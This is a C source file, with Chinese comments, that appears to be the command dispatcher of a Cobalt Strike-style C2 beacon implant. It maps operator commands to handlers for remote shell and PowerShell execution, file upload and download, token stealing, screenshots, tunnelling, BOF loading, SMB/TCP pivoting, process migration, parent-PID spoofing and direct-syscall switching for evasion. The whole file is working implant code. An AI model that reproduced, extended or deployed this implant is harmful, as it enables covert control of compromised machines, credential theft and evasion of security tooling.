#include "beacon_commands.h"
#include "beacon_cascade.h"
#include "beacon_spawn.h"

/*
 * 命令分发中心：
 * dispatcher 只负责按 command_id 路由，不在这里实现具体业务逻辑。
 * 返回的 PacketList 由 Agent 层统一包装、加密并放入出站队列。
 */

typedef PacketList (*CommandHandler)(BeaconContext* ctx, UINT32 task_id,
                                     UINT32 command_id, Parser* parser);

typedef struct CommandEntry {
    UINT32 id;
    CommandHandler handler;
} CommandEntry;

/* 将单个 ByteBuf 结果包装为 PacketList，兼容多数同步命令。 */
static PacketList CommandSingle(ByteBuf item)
{
    PacketList out;
    PlistInit(&out);
    PlistAdd(&out, item);
    return out;
}

/* 未注册命令的统一返回路径，保持原有错误格式。 */
static PacketList CommandUnknown(UINT32 command_id)
{
    ByteBuf msg;
    BbInit(&msg);
    BbPrintf(&msg, "command id %lu not registered", (ULONG)command_id);
    return CommandSingle(msg);
}

/* 以下 HandleXxx 函数只做分发适配：解析少量公共参数并调用具体命令实现。 */
static PacketList HandleSleep(BeaconContext* ctx, UINT32 task_id,
                              UINT32 command_id, Parser* p)
{
    ByteBuf msg;
    UINT32 count;
    UINT32 sleep_ms;
    (VOID)task_id;
    (VOID)command_id;

    /* wire 格式与 spawn_ppid 一致：packCountedInt32Args -> [count][sleep_ms][jitter?]。
     * 区分"参数缺失/截断"（解析错误）与"显式 0"（非法值）：旧实现遇到截断包会落到
     * sleep_ms=0，使 beacon 进入 0ms 忙轮询；UINT32→INT 直接强转还会产生负值。 */
    count = ParserU32(p);
    if (p->error[0] || count == 0) {
        return CommandSingle(BbFromText("sleep requires at least 1 argument"));
    }
    sleep_ms = ParserU32(p);
    if (p->error[0]) {
        return CommandSingle(BbFromText("sleep interval parse failed"));
    }
    if (sleep_ms == 0 || sleep_ms > (UINT32)0x7FFFFFFF) {
        return CommandSingle(BbFromText("sleep interval must be 1..2147483647 ms"));
    }

    ctx->profile.sleep_ms = (INT)sleep_ms;
    if (ParserLeft(p) >= 4) ctx->profile.jitter = (INT)ParserU32(p);

    BbInit(&msg);
    BbPrintf(&msg, "Sleep policy updated: Interval=%dms, Jitter=%d%%, hInstance=%p",
             ctx->profile.sleep_ms, ctx->profile.jitter, ctx->image_base);
    return CommandSingle(msg);
}

static PacketList HandleExit(BeaconContext* ctx, UINT32 task_id,
                             UINT32 command_id, Parser* p)
{
    PacketList out;
    (VOID)task_id;
    (VOID)command_id;
    (VOID)p;

    /* 同步关闭所有级联子通道并入队 CASCADE_DEAD 通知，必须在设置
     * should_exit 之前完成，确保 Dead 包能在本次 flushCascade +
     * flushOutbox 周期内发往 TeamServer，而不是在主循环退出后才生成。 */
    CascadeShutdownAll(&ctx->cascade);

    PlistInit(&out);
    out.should_exit = 1;
    PlistAdd(&out, BbFromText("Beacon exit command processed. Goodbye."));
    return out;
}

static PacketList HandleShell(BeaconContext* ctx, UINT32 task_id,
                              UINT32 command_id, Parser* p)
{
    return CommandSingle(CommandShell(ctx, task_id, command_id, p, 0));
}

static PacketList HandlePowerShell(BeaconContext* ctx, UINT32 task_id,
                                   UINT32 command_id, Parser* p)
{
    return CommandSingle(CommandShell(ctx, task_id, command_id, p, 1));
}

static PacketList HandleCd(BeaconContext* ctx, UINT32 task_id,
                           UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandCd(p));
}

static PacketList HandleLs(BeaconContext* ctx, UINT32 task_id,
                           UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandLs(p));
}

static PacketList HandlePwd(BeaconContext* ctx, UINT32 task_id,
                            UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    (VOID)p;
    return CommandSingle(CommandPwd());
}

static PacketList HandleCat(BeaconContext* ctx, UINT32 task_id,
                            UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandCat(p));
}

static PacketList HandleMkdir(BeaconContext* ctx, UINT32 task_id,
                              UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandMkdir(p));
}

static PacketList HandleRm(BeaconContext* ctx, UINT32 task_id,
                           UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandRm(p));
}

static PacketList HandleMv(BeaconContext* ctx, UINT32 task_id,
                           UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandMv(p));
}

static PacketList HandleCp(BeaconContext* ctx, UINT32 task_id,
                           UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandCp(p));
}

static PacketList HandleDownload(BeaconContext* ctx, UINT32 task_id,
                                 UINT32 command_id, Parser* p)
{
    (VOID)command_id;
    return TransferHandleDownload(ctx, task_id, p);
}

static PacketList HandleUpload(BeaconContext* ctx, UINT32 task_id,
                               UINT32 command_id, Parser* p)
{
    (VOID)command_id;
    return CommandSingle(TransferHandleUpload(ctx, task_id, p));
}

static PacketList HandlePs(BeaconContext* ctx, UINT32 task_id,
                           UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    (VOID)p;
    return CommandSingle(CommandPs());
}

static PacketList HandleKill(BeaconContext* ctx, UINT32 task_id,
                             UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandKill(p));
}

static PacketList HandleStealToken(BeaconContext* ctx, UINT32 task_id,
                                   UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandStealToken(p));
}

static PacketList HandleWhoami(BeaconContext* ctx, UINT32 task_id,
                               UINT32 command_id, Parser* p)
{
    (VOID)task_id;
    (VOID)command_id;
    (VOID)p;
    return CommandSingle(CommandWhoami(ctx));
}

static PacketList HandleNetinfo(BeaconContext* ctx, UINT32 task_id,
                                UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    (VOID)p;
    return CommandSingle(CommandNetinfo());
}

static PacketList HandleNetstat(BeaconContext* ctx, UINT32 task_id,
                                UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    (VOID)p;
    return CommandSingle(CommandNetstat());
}

static PacketList HandleFilebrowser(BeaconContext* ctx, UINT32 task_id,
                                    UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandFilebrowser(p));
}

static PacketList HandleSetattr(BeaconContext* ctx, UINT32 task_id,
                                UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandSetattr(p));
}

static PacketList HandleZip(BeaconContext* ctx, UINT32 task_id,
                            UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandZip(p));
}

static PacketList HandleJobs(BeaconContext* ctx, UINT32 task_id,
                             UINT32 command_id, Parser* p)
{
    (VOID)task_id;
    (VOID)command_id;
    (VOID)p;
    return CommandSingle(CommandJobs(ctx));
}

static PacketList HandleKillJob(BeaconContext* ctx, UINT32 task_id,
                                UINT32 command_id, Parser* p)
{
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandKillJob(ctx, p));
}

static PacketList HandleScreenshot(BeaconContext* ctx, UINT32 task_id,
                                   UINT32 command_id, Parser* p)
{
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CommandScreenshot(p));
}

static PacketList HandleTunnelStart(BeaconContext* ctx, UINT32 task_id,
                                    UINT32 command_id, Parser* p)
{
    (VOID)command_id;
    return TunnelHandleStart(ctx, task_id, p);
}

static PacketList HandleTunnelControl(BeaconContext* ctx, UINT32 task_id,
                                      UINT32 command_id, Parser* p)
{
    (VOID)task_id;
    (VOID)command_id;
    return TunnelHandleControl(&ctx->tunnels, p, NULL);
}

static PacketList HandleTunnelData(BeaconContext* ctx, UINT32 task_id,
                                   UINT32 command_id, Parser* p)
{
    (VOID)task_id;
    (VOID)command_id;
    return TunnelHandleData(&ctx->tunnels, p);
}

static PacketList HandleTunnelClose(BeaconContext* ctx, UINT32 task_id,
                                    UINT32 command_id, Parser* p)
{
    (VOID)task_id;
    (VOID)command_id;
    return TunnelHandleControl(&ctx->tunnels, p, "close");
}

static PacketList HandleBof(BeaconContext* ctx, UINT32 task_id,
                            UINT32 command_id, Parser* p)
{
    (VOID)command_id;
    return CommandBofHandle(ctx, task_id, p);
}

static PacketList HandleCascadeConnectTcp(BeaconContext* ctx, UINT32 task_id,
                                          UINT32 command_id, Parser* p)
{
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CascadeHandleConnectTcp(ctx, p));
}

static PacketList HandleCascadeLinkSmb(BeaconContext* ctx, UINT32 task_id,
                                       UINT32 command_id, Parser* p)
{
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CascadeHandleLinkSmb(ctx, p));
}

static PacketList HandleCascadeRoute(BeaconContext* ctx, UINT32 task_id,
                                     UINT32 command_id, Parser* p)
{
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CascadeHandleRoute(ctx, p));
}

static PacketList HandleCascadeClose(BeaconContext* ctx, UINT32 task_id,
                                     UINT32 command_id, Parser* p)
{
    (VOID)task_id;
    (VOID)command_id;
    return CommandSingle(CascadeHandleClose(ctx, p));
}

static PacketList HandlePostEx(BeaconContext* ctx, UINT32 task_id,
                               UINT32 command_id, Parser* p)
{
    (VOID)command_id;
    return CommandSingle(PostExHandle(ctx, task_id, p));
}

static PacketList HandleMigrate(BeaconContext* ctx, UINT32 task_id,
                                UINT32 command_id, Parser* p)
{
    (VOID)command_id;
    return CommandSingle(MigrateHandle(ctx, task_id, p));
}

/* spawn_ppid [pid]：设置/查询全局 PPID 欺骗目标（0 = 关闭欺骗）。
 * wire 格式与 sleep 一致：packCountedInt32Args -> [count][pid...]；
 * count=0 时查询当前值。 */
static PacketList HandleSpawnPpid(BeaconContext* ctx, UINT32 task_id,
                                  UINT32 command_id, Parser* p)
{
    ByteBuf msg;
    UINT32 count;
    (VOID)ctx;
    (VOID)task_id;
    (VOID)command_id;

    BbInit(&msg);
    count = ParserU32(p);
    if (count >= 1) {
        UINT32 pid = ParserU32(p);
        if (p->error[0]) {
            return CommandSingle(BbFromText(p->error));
        }
        SpawnSetPpid(pid);
        BbPrintf(&msg, "spawn_ppid set: %lu%s", (ULONG)pid,
                 pid ? "" : " (ppid spoofing disabled)");
    } else {
        UINT32 current = SpawnGetPpid();
        BbPrintf(&msg, "spawn_ppid = %lu%s", (ULONG)current,
                 current ? "" : " (ppid spoofing disabled)");
    }
    return CommandSingle(msg);
}

/* syscall <on|off>：运行时切换 syscall（覆盖/恢复 Win32Api 槽位）。
 * wire 格式：packCountedStringArgs -> [count]["on"/"off"]；count=0 时查询。 */
static PacketList HandleSyscall(BeaconContext* ctx, UINT32 task_id,
                                UINT32 command_id, Parser* p)
{
    ByteBuf msg;
    UINT32 count;
    (VOID)task_id;
    (VOID)command_id;

    count = ParserU32(p);
    if (count >= 1) {
        CHAR* arg;
        CHAR errbuf[160];

        if (p->error[0]) {
            /* 协议截断：区分于合法的 count=0 查询路径 */
            snprintf(errbuf, sizeof(errbuf), "syscall: %s", p->error);
            return CommandSingle(BbFromText(errbuf));
        }
        arg = ParserString(p);
        if (arg) {
            if (_stricmp(arg, "on") == 0) {
                SyscallSetEnabled(&ctx->syscall, &ctx->api, TRUE);
            } else if (_stricmp(arg, "off") == 0) {
                SyscallSetEnabled(&ctx->syscall, &ctx->api, FALSE);
            } else {
                HeapFree(GetProcessHeap(), 0, arg);
                return CommandSingle(BbFromText("syscall requires 'on' or 'off'"));
            }
            HeapFree(GetProcessHeap(), 0, arg);
        }
    }

    BbInit(&msg);
    BbPrintf(&msg, "syscall %s", ctx->syscall.bound ? "enabled" : "disabled");
    return CommandSingle(msg);
}

/*
 * 命令注册表：只保存 command id 和函数指针，不携带可读命令名。
 * 未注册的 CASCADE_OPEN/READ/DEAD/PING 与 POSTEX_EVENT 是出站或内部事件 ID，
 * 不是 teamserver 下发的入站命令，保持不进入此表。
 */
static const CommandEntry g_commands[] = {
    { BEACON_COMMAND_SLEEP,               HandleSleep },
    { BEACON_COMMAND_EXIT,                HandleExit },
    { BEACON_COMMAND_SHELL,               HandleShell },
    { BEACON_COMMAND_POWERSHELL,          HandlePowerShell },
    { BEACON_COMMAND_CD,                  HandleCd },
    { BEACON_COMMAND_LS,                  HandleLs },
    { BEACON_COMMAND_PWD,                 HandlePwd },
    { BEACON_COMMAND_CAT,                 HandleCat },
    { BEACON_COMMAND_MKDIR,               HandleMkdir },
    { BEACON_COMMAND_RM,                  HandleRm },
    { BEACON_COMMAND_MV,                  HandleMv },
    { BEACON_COMMAND_CP,                  HandleCp },
    { BEACON_COMMAND_DOWNLOAD,            HandleDownload },
    { BEACON_COMMAND_UPLOAD,              HandleUpload },
    { BEACON_COMMAND_PS,                  HandlePs },
    { BEACON_COMMAND_KILL,                HandleKill },
    { BEACON_COMMAND_STEALTOKEN,          HandleStealToken },
    { BEACON_COMMAND_WHOAMI,              HandleWhoami },
    { BEACON_COMMAND_NETINFO,             HandleNetinfo },
    { BEACON_COMMAND_NETSTAT,             HandleNetstat },
    { BEACON_COMMAND_FILEBROWSER,         HandleFilebrowser },
    { BEACON_COMMAND_SETATTR,             HandleSetattr },
    { BEACON_COMMAND_ZIP,                 HandleZip },
    { BEACON_COMMAND_JOBS,                HandleJobs },
    { BEACON_COMMAND_KILLJOB,             HandleKillJob },
    { BEACON_COMMAND_SCREENSHOT,          HandleScreenshot },
    { BEACON_COMMAND_TUNNEL_START,        HandleTunnelStart },
    { BEACON_COMMAND_TUNNEL_CONTROL,      HandleTunnelControl },
    { BEACON_COMMAND_TUNNEL_DATA,         HandleTunnelData },
    { BEACON_COMMAND_TUNNEL_CLOSE,        HandleTunnelClose },
    { BEACON_COMMAND_BOF,                 HandleBof },
    { BEACON_COMMAND_CASCADE_CONNECT_TCP, HandleCascadeConnectTcp },
    { BEACON_COMMAND_CASCADE_LINK_SMB,    HandleCascadeLinkSmb },
    { BEACON_COMMAND_CASCADE_ROUTE,       HandleCascadeRoute },
    { BEACON_COMMAND_CASCADE_CLOSE,       HandleCascadeClose },
    { BEACON_COMMAND_POSTEX,              HandlePostEx },
    { BEACON_COMMAND_MIGRATE,             HandleMigrate },
    { BEACON_COMMAND_SPAWN_PPID,          HandleSpawnPpid },
    { BEACON_COMMAND_SYSCALL,             HandleSyscall }
};

/* 按 command id 在线性静态表中查找 handler。 */
static const CommandEntry* CommandFind(UINT32 command_id)
{
    SIZE_T i;
    for (i = 0; i < sizeof(g_commands) / sizeof(g_commands[0]); i++) {
        if (g_commands[i].id == command_id) return &g_commands[i];
    }
    return NULL;
}

/* 根据 command_id 将信标命令分发到对应的处理函数 */
PacketList CommandDispatch(BeaconContext* ctx, UINT32 task_id, UINT32 command_id, const ByteBuf* payload)
{
    Parser p;
    const CommandEntry* entry;

    ParserInit(&p, payload->data, payload->len);

    entry = CommandFind(command_id);
    if (!entry) return CommandUnknown(command_id);

    return entry->handler(ctx, task_id, command_id, &p);
}
